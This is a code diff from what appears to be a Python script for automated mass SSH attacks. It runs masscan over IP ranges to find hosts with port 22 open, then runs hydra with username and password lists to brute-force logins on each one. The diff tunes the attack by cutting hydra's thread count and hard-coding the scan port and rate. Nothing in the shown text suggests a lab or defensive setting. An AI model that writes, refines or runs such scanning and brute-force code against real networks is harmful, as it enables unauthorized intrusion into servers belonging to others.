@@ -37,7 +37,7 @@ def save_err(err):
 
 def brute(ip):
     print(f"[+] Hydra -> {ip}")
-    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 128 -T 5 -W 1 -V 2>&1"
+    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 4 -T 5 -W 1 -V 2>&1"
     res = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
 
     found = False
@@ -73,7 +73,7 @@ while current_ip <= end_ip:
     next_ip = min(current_ip + BATCH - 1, end_ip)
     
     # Masscan-Befehl erstellen
-    cmd = f"masscan -p{PORT} --open --rate={RATE} --range {current_ip}-{next_ip} --output-format=json --output-filename={OUTPUT_FILE} --exclude 255.255.255.255"
+    cmd = f"masscan -p 22 --open --rate=20000 --range {current_ip}-{next_ip} --output-format=json --output-filename={OUTPUT_FILE} --exclude 255.255.255.255"
     
     print(f"[DEBUG] Running: {cmd}")
     subprocess.run(cmd, shell=True)
